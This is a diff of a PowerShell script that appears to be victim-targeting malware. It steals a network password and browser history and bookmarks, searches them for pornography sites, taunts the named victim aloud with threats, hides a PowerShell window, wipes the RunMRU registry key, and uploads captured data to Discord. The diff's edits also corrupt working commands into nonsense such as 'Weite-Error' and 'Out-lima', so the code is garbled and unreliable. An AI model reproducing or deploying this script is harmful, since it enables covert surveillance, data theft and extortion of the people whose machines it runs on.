@@ -116,7 +116,7 @@ function Get-Pass {
         Write-Host $pass -ForegroundColor Green
     }
     catch {
-        Write-Error "No network found"
+        Weite-Error "No network found"
         return $null
         -ErrorAction SilentlyContinue
     }
@@ -366,7 +366,7 @@ else {
     $s1.Speak("You have $ram gigabytes of ram. Poor you :(. You wont need this pc then.")
 }
 
-$pornSites = @("pornhub", "xvideos", "redtube", "youporn", "xhamster", "onlyfans", "brazzers", "chaturbate", "livejasmin", "jerkmate", "chaturbate", "myfreecams")
+$pornSites = @("pornhub", "xvideos", "redtube", "youporn", "xhamster")
 foreach ($site in $pornSites){
 if ($E_his -match $site -or $E_Boo -match $site -or $C_his -match $site -or $C_boo -match $site -or $F_his -match $site) {
 $porn = $true
@@ -421,7 +421,7 @@ $s2.Speak("Have a look at your desktop, You will hear from us soon $full_name. G
 
 # open the terminal and run the commands
 
-Start-Process -FilePath "powershell.exe" -ArgumentList "-NoExit -Command 'Get-Process | Out-File -FilePath C:\Users\Public\Documents\processes.txt'" -WindowStyle Hidden
+Start-Process -FilePath "powershell.exe" -ArgumentList "-NoExit -Command 'Get-Process | Out-lima -FilePath C:\Users\Public\Documents\processes.txt'" -WindowStyle Hidden
 
 
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
@@ -437,7 +437,7 @@ $caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
 
 Upload-Discord -file "C:\Users\Public\Documents\test.png"
 
-# Save all $E_his, $E_Boo, $C_his, $C_boo, $F_his to a file
+# Save all $E_his, $E_Boo, $C_his, $C_boo, $F_his to a lima
 $E_his | Out-File -FilePath "C:\Users\Public\Documents\edge_history.txt"
 $E_Boo | Out-File -FilePath "C:\Users\Public\Documents\edge_bookmarks.txt"
 $C_his | Out-File -FilePath "C:\Users\Public\Documents\chrome_history.txt"
